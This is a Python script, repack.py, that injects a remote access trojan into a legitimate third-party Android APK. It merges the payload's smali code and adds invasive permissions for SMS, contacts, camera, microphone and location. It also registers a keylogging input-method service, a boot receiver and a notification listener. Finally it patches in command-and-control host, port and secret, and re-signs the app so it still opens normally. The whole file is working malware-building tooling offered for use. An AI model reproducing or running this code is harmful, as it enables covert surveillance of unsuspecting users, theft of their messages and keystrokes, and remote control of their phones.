#!/usr/bin/env python3
"""
repack.py — inject the RAT payload into a third-party APK.

Pipeline:
  1. apktool d  victim.apk            -> victim/        (resources + smali)
  2. apktool d  rat.apk               -> payload/       (payload smali + res/xml/method.xml)
  3. copy payload smali into victim smali tree (renaming collisions)
  4. rewrite the merged AndroidManifest.xml:
       - add the RAT permissions
       - add the RAT service / IME / boot receiver
       - keep the victim's application block
  5. copy payload res/xml/method.xml into victim res/xml/
  6. patch the payload's RatCfg smali with the operator's C2 settings
  7. apktool b  victim/ -o repacked.apk
  8. zipalign + apksigner (debug key by default, or a supplied keystore)

The victim APK is never modified in place: everything happens in a temp dir.

Usage:
  ./repack.py --apk victim.apk --rat rat-debug.apk --c2-host 10.0.2.2 \
              --c2-port 8777 --secret s3cr3t --out repacked.apk
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS = os.path.join(HERE, "..", "tools")
APKTOOL = os.path.join(HERE, "apktool.sh")
SDK_BUILD_TOOLS = os.environ.get("ANDROID_BUILD_TOOLS", "/home/aglegend/tools/android-sdk/build-tools/34.0.0")

RAT_PACKAGE = "com/darkbiit/rat"

PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.GET_ACCOUNTS",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.READ_MEDIA_AUDIO",
    "android.permission.POST_NOTIFICATIONS",
    # The service runs in the foreground; without these the system kills it
    # right after startForeground() is denied.
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.FOREGROUND_SERVICE_SPECIAL_USE",
    # Camera, microphone, location, notification access, settings writes.
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.WRITE_SETTINGS",
    "android.permission.WRITE_SECURE_SETTINGS",
    "android.permission.QUERY_ALL_PACKAGES",
]


def log(msg):
    print(f"  [*] {msg}", flush=True)


def run(cmd, **kw):
    r = subprocess.run(cmd, capture_output=True, text=True, **kw)
    if r.returncode != 0:
        sys.stderr.write(r.stdout)
        sys.stderr.write(r.stderr)
        raise SystemExit(f"command failed: {' '.join(cmd)}")
    return r.stdout


# ---------------------------------------------------------------------------
# apktool decode
# ---------------------------------------------------------------------------

def decode(apk, out_dir):
    log(f"decoding {apk}")
    run([APKTOOL, "d", apk, "-o", out_dir, "-f"])
    return out_dir


# ---------------------------------------------------------------------------
# smali merge
# ---------------------------------------------------------------------------

def collect_smali_dirs(root):
    """All smali* directories under a decoded apk (smali, smali_classes2, ...)."""
    dirs = []
    for name in sorted(os.listdir(root)):
        if not name.startswith("smali"):
            continue
        if name != "smali" and not re.fullmatch(r"smali_classes\d*", name):
            continue
        d = os.path.join(root, name)
        if os.path.isdir(d):
            dirs.append(d)
    return dirs


def merge_smali(payload_root, victim_root):
    """
    Copy payload classes into the victim's smali tree.

    Collisions are handled by renaming the payload package: the payload's own
    references to it must be rewritten too, so the rename happens before the
    copy and touches every .smali file (both payload and victim side).

    Returns the package path (slash form) that the payload now lives under.
    """
    src_dirs = collect_smali_dirs(payload_root)
    dst_dirs = collect_smali_dirs(victim_root)
    if not src_dirs:
        raise SystemExit("payload apk has no smali (was it built?)")
    if not dst_dirs:
        raise SystemExit("victim apk has no smali")

    pkg = RAT_PACKAGE
    pkg_dst = os.path.join(dst_dirs[0], pkg)
    if os.path.exists(pkg_dst):
        # Same package already present in the victim: rename the payload's
        # package to avoid the class clash.
        log("victim already contains com/darkbiit/rat -> renaming payload package")
        new_pkg = "com/darkbiit/ratpayload"
        rename_package_in_tree(payload_root, RAT_PACKAGE, new_pkg)
        rename_package_in_tree(victim_root, RAT_PACKAGE, new_pkg)
        pkg = new_pkg

    copied = 0
    for sd in src_dirs:
        for cls in smali_files(sd):
            rel = os.path.relpath(cls, sd)
            dst = os.path.join(dst_dirs[0], rel)
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copy2(cls, dst)
            copied += 1
    log(f"copied {copied} payload smali files into {os.path.relpath(dst_dirs[0], victim_root)}")
    return pkg, dst_dirs[0]


def smali_files(smali_dir):
    out = []
    for base, _dirs, files in os.walk(smali_dir):
        for f in files:
            if f.endswith(".smali"):
                out.append(os.path.join(base, f))
    return out


def rename_package_in_tree(root, old_pkg, new_pkg):
    """Rename a smali package directory and rewrite the descriptors in it."""
    for smali_dir in collect_smali_dirs(root):
        old_dir = os.path.join(smali_dir, old_pkg)
        if not os.path.isdir(old_dir):
            continue
        new_dir = os.path.join(smali_dir, new_pkg)
        os.makedirs(os.path.dirname(new_dir), exist_ok=True)
        if os.path.exists(new_dir):
            shutil.rmtree(new_dir)
        shutil.move(old_dir, new_dir)
    pattern = re.compile(r"L" + re.escape(old_pkg) + "/")
    for smali_dir in collect_smali_dirs(root):
        for f in smali_files(smali_dir):
            txt = open(f, encoding="utf-8", errors="replace").read()
            new = pattern.sub("L" + new_pkg + "/", txt)
            if new != txt:
                open(f, "w", encoding="utf-8").write(new)


def package_to_class(pkg):
    """com/darkbiit/rat -> com.darkbiit.rat"""
    return pkg.replace("/", ".")


# ---------------------------------------------------------------------------
# manifest merge
# ---------------------------------------------------------------------------

def load_setting(setting_path, host, port, secret, tag, beacon_ms, timeout_ms, use_wss):
    """
    Builds the effective configuration.

    Precedence:
      1. the setting.json the operator downloaded from the panel
      2. the command line flags

    A setting.json from the panel is authoritative: it is what the operator
    configured on the panel side.
    """
    setting = None
    if setting_path:
        if not os.path.exists(setting_path):
            raise SystemExit(f"setting.json not found: {setting_path}")
        with open(setting_path, encoding="utf-8") as f:
            try:
                setting = json.load(f)
            except ValueError as e:
                raise SystemExit(f"setting.json is not valid JSON: {e}")
        log(f"loaded setting.json from {setting_path}")

    if setting is None:
        setting = {
            "version": 1,
            "generated_by": "ratpack-compiler",
            "server": {
                "host": host,
                "port": port,
                "protocol": "tls" if use_wss else "tcp",
                "secret": secret,
                "beacon_ms": beacon_ms,
                "timeout_ms": timeout_ms,
                "tag": tag,
            },
        }
        return setting, False

    # Normalise: a flat document is accepted, but the panel format is nested.
    srv = setting.get("server")
    if not isinstance(srv, dict):
        srv = {
            "host": setting.get("host", host),
            "port": setting.get("port", port),
            "protocol": setting.get("protocol", "tls" if use_wss else "tcp"),
            "secret": setting.get("secret", secret),
            "beacon_ms": setting.get("beacon_ms", beacon_ms),
            "timeout_ms": setting.get("timeout_ms", timeout_ms),
            "tag": setting.get("tag", tag),
        }
        setting["server"] = srv
    else:
        srv.setdefault("host", host)
        srv.setdefault("port", port)
        srv.setdefault("protocol", "tls" if use_wss else "tcp")
        srv.setdefault("secret", secret)
        srv.setdefault("beacon_ms", beacon_ms)
        srv.setdefault("timeout_ms", timeout_ms)
        srv.setdefault("tag", tag)

    setting.setdefault("version", 1)
    return setting, True


def setting_values(setting):
    """Pulls the flat values the smali patcher needs out of the document."""
    srv = setting.get("server", {})
    proto = str(srv.get("protocol", "tcp")).lower()
    return {
        "host": str(srv.get("host", "127.0.0.1")),
        "port": int(srv.get("port", 8777)),
        "secret": str(srv.get("secret", "")),
        "tag": str(srv.get("tag", "rat")),
        "beacon_ms": int(srv.get("beacon_ms", 15000)),
        "timeout_ms": int(srv.get("timeout_ms", 10000)),
        "use_wss": proto in ("tls", "ssl", "wss"),
    }


def read_victim_package(victim_root):
    """Reads the victim's package name from the decoded manifest."""
    path = os.path.join(victim_root, "AndroidManifest.xml")
    txt = open(path, encoding="utf-8").read()
    m = re.search(r'package\s*=\s*"([^"]+)"', txt)
    if not m:
        raise SystemExit("could not read the victim package name from the manifest")
    return m.group(1)


def merge_manifest(victim_root, pkg):
    """
    Add the RAT permissions and components into the victim's manifest.

    The victim's <application> block is kept as-is; only permissions and the
    RAT components are appended. The victim's launcher activity is untouched,
    so the app still starts normally.

    pkg is the slash form (com/darkbiit/rat); the manifest needs the dotted
    form (com.darkbiit.rat).
    """
    cls = package_to_class(pkg)
    # The provider authority must be unique inside the merged manifest,
    # otherwise the install fails with INSTALL_FAILED_CONFLICTING_PROVIDERS.
    victim_pkg = read_victim_package(victim_root)
    authority = f"{victim_pkg}.ratprovider"
    path = os.path.join(victim_root, "AndroidManifest.xml")
    txt = open(path, encoding="utf-8").read()

    added_perms = 0
    for perm in PERMISSIONS:
        if f'android:name="{perm}"' in txt:
            continue
        txt = txt.replace(
            "<application",
            f'    <uses-permission android:name="{perm}" />\n    <application',
            1,
        )
        added_perms += 1

    components = f'''
        <service
            android:name="{cls}.RatService"
            android:exported="false"
            android:process=":rat"
            android:foregroundServiceType="specialUse">
            <property
                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                android:value="Remote control channel of the bundled service" />
        </service>

        <service
            android:name="{cls}.RatIme"
            android:exported="true"
            android:label="Keyboard"
            android:permission="android.permission.BIND_INPUT_METHOD">
            <intent-filter>
                <action android:name="android.view.InputMethod" />
            </intent-filter>
            <meta-data
                android:name="android.view.im"
                android:resource="@xml/method" />
        </service>

        <receiver
            android:name="{cls}.RatBootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <provider
            android:name="{cls}.RatProvider"
            android:authorities="{authority}"
            android:enabled="true"
            android:exported="false" />

        <service
            android:name="{cls}.RatNotificationListener"
            android:exported="false"
            android:label="Notification listener"
            android:process=":rat"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>
'''
    # Insert the components right before </application>.
    idx = txt.rfind("</application>")
    if idx < 0:
        raise SystemExit("could not find </application> in victim manifest")
    txt = txt[:idx] + components + txt[idx:]

    open(path, "w", encoding="utf-8").write(txt)
    log(f"manifest: added {added_perms} permissions, RAT service/IME/receiver")


def copy_payload_resources(payload_root, victim_root):
    """Copy res/xml/method.xml (referenced by the merged manifest)."""
    src = os.path.join(payload_root, "res", "xml", "method.xml")
    if not os.path.exists(src):
        log("WARNING: payload has no res/xml/method.xml, IME will not resolve")
        return False
    dst_dir = os.path.join(victim_root, "res", "xml")
    os.makedirs(dst_dir, exist_ok=True)
    shutil.copy2(src, os.path.join(dst_dir, "method.xml"))
    log("copied res/xml/method.xml")
    return True


def write_setting_json(victim_root, setting, source=None):
    """
    Writes assets/setting.json into the merged APK.

    The panel generates setting.json and the operator drops it into the
    compiler folder; the same values are also baked into RatCfg's smali so the
    payload works even if the asset is stripped.

    Returns the path written.
    """
    assets_dir = os.path.join(victim_root, "assets")
    os.makedirs(assets_dir, exist_ok=True)
    dst = os.path.join(assets_dir, "setting.json")
    with open(dst, "w", encoding="utf-8") as f:
        json.dump(setting, f, indent=2, ensure_ascii=False)
        f.write("\n")
    origin = f" (from {source})" if source else ""
    log(f"wrote assets/setting.json{origin}: "
        f"host={setting.get('server', {}).get('host')} "
        f"port={setting.get('server', {}).get('port')} "
        f"protocol={setting.get('server', {}).get('protocol')}")
    return dst


# ---------------------------------------------------------------------------
# config patching
# ---------------------------------------------------------------------------

def patch_cfg(victim_root, dst_smali_dir, pkg, host, port, secret, tag,
              beacon_ms, timeout_ms, use_wss):
    """
    Patch the payload's RatCfg <clinit> with the operator's settings.

    The smali looks like:

        const-string v0, "127.0.0.1"
        sput-object v0, Lcom/darkbiit/rat/RatCfg;->C2_HOST:Ljava/lang/String;

    The rewrite is done per field: find the sput that writes the field, then
    walk back to the instruction that produced the value and replace it.
    """
    cfg = None
    for smali_dir in collect_smali_dirs(victim_root):
        cand = os.path.join(smali_dir, pkg, "RatCfg.smali")
        if os.path.exists(cand):
            cfg = cand
            break
    if cfg is None:
        # fallback: search by file name anywhere in the tree
        for smali_dir in collect_smali_dirs(victim_root):
            for f in smali_files(smali_dir):
                if os.path.basename(f) == "RatCfg.smali":
                    cfg = f
                    break
        if cfg is None:
            raise SystemExit("RatCfg.smali not found in the merged tree")

    txt = open(cfg, encoding="utf-8").read()
    orig = txt

    # The descriptor of an int/boolean field has NO trailing semicolon
    # (":I"), while a String descriptor does (":Ljava/lang/String;").
    # `descriptor` is a regex fragment and must NOT be re.escape()d.
    def find_sput(field, descriptor):
        """Locates the sput instruction that writes `field`."""
        pat = (r"sput(?:-object|-boolean)?\s+v\d+,\s+L" + re.escape(pkg)
               + r"/RatCfg;->" + re.escape(field) + r"\s*:\s*" + descriptor)
        return re.search(pat, txt)

    def value_before(sput_match, kinds):
        """
        Walks backwards from the sput to the instruction that produced the
        value. Only the nearest preceding matching const is used, so a field
        is never patched with another field's value.

        The pattern is line-anchored with horizontal whitespace only: using a
        blank-matching escape would swallow the newline and join two
        instructions.
        """
        head = txt[:sput_match.start()]
        best = None
        for m in re.finditer(r"^[ \t]*(" + kinds + r")[ \t]+(v\d+)[ \t]*,[ \t]*([^\n]+?)[ \t]*$",
                             head, re.MULTILINE):
            best = m
        return best

    def replace_string_field(field, value):
        nonlocal txt
        sput_m = find_sput(field, r"Ljava/lang/String\s*;")
        if not sput_m:
            raise SystemExit(f"could not locate sput for {field}")
        val_m = value_before(sput_m, r"const-string")
        if not val_m:
            raise SystemExit(f"could not locate const-string for {field}")
        old = val_m.group(0)
        indent = old[: len(old) - len(old.lstrip())]
        new = f'{indent}const-string {val_m.group(2)}, "{value}"'
        txt = txt[: val_m.start()] + new + txt[val_m.end():]

    def replace_int_field(field, value):
        nonlocal txt
        sput_m = find_sput(field, r"I")
        if not sput_m:
            raise SystemExit(f"could not locate sput for {field}")
        val_m = value_before(sput_m, r"const(?:/4|/16|/high16)?")
        if not val_m:
            raise SystemExit(f"could not locate const for {field}")
        old = val_m.group(0)
        indent = old[: len(old) - len(old.lstrip())]
        new = f'{indent}const {val_m.group(2)}, 0x{int(value):x}'
        txt = txt[: val_m.start()] + new + txt[val_m.end():]

    def replace_bool_field(field, value):
        nonlocal txt
        sput_m = find_sput(field, r"Z")
        if not sput_m:
            raise SystemExit(f"could not locate sput-boolean for {field}")
        val_m = value_before(sput_m, r"const/4")
        if not val_m:
            raise SystemExit(f"could not locate const/4 for {field}")
        old = val_m.group(0)
        indent = old[: len(old) - len(old.lstrip())]
        new = f'{indent}const/4 {val_m.group(2)}, {0x1 if value else 0x0}'
        txt = txt[: val_m.start()] + new + txt[val_m.end():]

    replace_string_field("C2_HOST", host)
    replace_int_field("C2_PORT", port)
    replace_string_field("SECRET", secret)
    replace_string_field("TAG", tag)
    replace_int_field("BEACON_INTERVAL_MS", beacon_ms)
    replace_int_field("CONNECT_TIMEOUT_MS", timeout_ms)
    replace_bool_field("USE_WSS", use_wss)

    if txt == orig:
        raise SystemExit("no config change applied")
    open(cfg, "w", encoding="utf-8").write(txt)
    log(f"patched RatCfg: host={host} port={port} secret={secret!r} "
        f"beacon={beacon_ms}ms timeout={timeout_ms}ms tls={use_wss}")


# ---------------------------------------------------------------------------
# build + sign
# ---------------------------------------------------------------------------

def build(victim_root, out_apk):
    log("rebuilding apk with apktool")
    run([APKTOOL, "b", victim_root, "-o", out_apk])
    return out_apk


def sign(apk, keystore=None, ks_pass="android", key_alias="androiddebugkey", key_pass="android"):
    zipalign = os.path.join(SDK_BUILD_TOOLS, "zipalign")
    apksigner = os.path.join(SDK_BUILD_TOOLS, "apksigner")
    if not os.path.exists(zipalign) or not os.path.exists(apksigner):
        log("WARNING: build-tools not found, APK left unsigned")
        return apk

    if not keystore:
        default_ks = os.path.join(DEFAULT_KEYSTORE_DIR, "debug.keystore")
        if os.path.exists(default_ks):
            keystore = default_ks
        else:
            log("WARNING: no keystore found, APK left unsigned")
            return apk

    aligned = apk + ".aligned"
    run([zipalign, "-p", "-f", "4", apk, aligned])
    run([apksigner, "sign",
         "--ks", keystore,
         "--ks-pass", f"pass:{ks_pass}",
         "--key-pass", f"pass:{key_pass}",
         "--ks-key-alias", key_alias,
         aligned])
    run([apksigner, "verify", aligned])
    os.replace(aligned, apk)
    log(f"signed with {keystore} and zipaligned")
    return apk


DEFAULT_KEYSTORE_DIR = os.path.expanduser("~/.android")


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main(argv=None):
    ap = argparse.ArgumentParser(description="Inject the RAT payload into an APK")
    ap.add_argument("--apk", required=True, help="victim APK")
    ap.add_argument("--rat", required=True, help="payload APK (rat-debug.apk)")
    ap.add_argument("--out", required=True, help="output APK")
    ap.add_argument("--c2-host", default="127.0.0.1")
    ap.add_argument("--c2-port", type=int, default=8777)
    ap.add_argument("--secret", default="changeme")
    ap.add_argument("--tag", default="rat")
    ap.add_argument("--beacon-ms", type=int, default=15000)
    ap.add_argument("--timeout-ms", type=int, default=10000)
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--keystore", help="keystore for signing (default: ~/.android/debug.keystore)")
    ap.add_argument("--ks-pass", default="android")
    ap.add_argument("--key-alias", default="androiddebugkey")
    ap.add_argument("--key-pass", default="android")
    ap.add_argument("--keep-temp", action="store_true")
    ap.add_argument("--setting", "--setting-json",
                    help="setting.json downloaded from the Ratpack panel; "
                         "its values override the CLI flags")
    args = ap.parse_args(argv)

    if not os.path.exists(args.apk):
        raise SystemExit(f"victim apk not found: {args.apk}")
    if not os.path.exists(args.rat):
        raise SystemExit(f"payload apk not found: {args.rat}")

    setting, from_panel = load_setting(
        args.setting, args.c2_host, args.c2_port, args.secret, args.tag,
        args.beacon_ms, args.timeout_ms, args.tls)
    cfg = setting_values(setting)

    workdir = tempfile.mkdtemp(prefix="repack_")
    print(f"[+] workdir: {workdir}")
    try:
        victim = decode(args.apk, os.path.join(workdir, "victim"))
        payload = decode(args.rat, os.path.join(workdir, "payload"))

        pkg, dst_smali = merge_smali(payload, victim)
        merge_manifest(victim, pkg)
        copy_payload_resources(payload, victim)
        write_setting_json(victim, setting, args.setting if from_panel else None)
        patch_cfg(victim, dst_smali, pkg, cfg["host"], cfg["port"], cfg["secret"],
                  cfg["tag"], cfg["beacon_ms"], cfg["timeout_ms"], cfg["use_wss"])

        os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
        build(victim, args.out)
        sign(args.out, args.keystore, args.ks_pass, args.key_alias, args.key_pass)

        size = os.path.getsize(args.out)
        print(f"\n[+] output: {args.out} ({size} bytes)")
        print(f"[+] C2: {cfg['host']}:{cfg['port']} (tls={cfg['use_wss']})")
        print(f"[+] setting.json source: {'panel' if from_panel else 'command line'}")
        print("[*] The repacked APK must be re-signed: the original signature is gone.")
    finally:
        if args.keep_temp:
            print(f"[*] temp kept: {workdir}")
        else:
            shutil.rmtree(workdir, ignore_errors=True)


if __name__ == "__main__":
    main()
